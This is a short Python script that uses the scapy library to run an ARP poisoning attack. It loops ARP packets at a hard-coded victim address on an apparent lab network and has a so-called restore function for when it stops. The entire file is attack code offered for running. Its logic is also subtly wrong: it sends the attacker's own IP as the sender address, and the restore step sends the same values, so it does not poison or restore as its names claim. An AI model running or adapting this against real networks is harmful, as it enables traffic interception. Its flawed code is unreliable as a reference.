import time
import random
from scapy.all import ARP, send


def restore_arp_table(
    victim_mac: str, victim_ip: str, attacker_mac: str, attacker_ip: str
):
    arp = ARP()

    arp.hwsrc = attacker_mac
    arp.hwdst = "FF:FF:FF:FF:FF:FF"
    arp.psrc = attacker_ip
    arp.pdst = victim_ip

    arp.op = 2 # ARP Reply

    send(arp, count=10)


def arp_poisoning(victim_mac: str, victim_ip: str, attacker_mac: str, attacker_ip: str):
    arp = ARP()

    arp.hwsrc = attacker_mac
    arp.hwdst = victim_mac
    arp.psrc = attacker_ip
    arp.pdst = victim_ip

    arp.op = 1  # ARP Request

    while True:
        try:
            send(arp)
            time.sleep(1)
        except KeyboardInterrupt:
            restore_arp_table(victim_mac, victim_ip, attacker_mac, attacker_ip)
            break

victim_mac = "08:00:27:47:3B:DC"
victim_ip = "192.168.56.102"

attacker_mac = "08:00:27:2e:4e:1c"
attacker_ip = "192.168.56.200"

arp_poisoning(victim_mac, victim_ip, attacker_mac, attacker_ip)
